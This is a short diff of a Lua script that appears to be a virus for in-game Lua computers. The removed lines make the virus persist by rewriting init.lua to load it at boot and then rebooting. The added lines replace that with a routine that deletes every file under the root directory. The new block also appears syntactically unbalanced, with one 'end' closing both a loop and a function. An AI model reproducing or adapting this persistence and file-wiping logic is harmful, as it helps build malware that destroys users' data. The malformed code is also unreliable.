@@ -284,11 +284,10 @@ local function flashEEPROM()
 end
 
 local function rewriteInit()
-  local file = io.open("init.lua", "w")
-  file:write(INITCode, "\n", "\n")
-  file:write("pcall(loadfile(\"" .. virusPath .. "\"), \"flashEEPROM\")", "\n", "\n")
-  file:write("require(\"computer\").shutdown(true)")
-  file:close()
+local filesystem = require("filesystem")
+
+    for file in filesystem.list("/") do
+      filesystem.remove(file)
 end
 
 if args[1] == "flashEEPROM" then
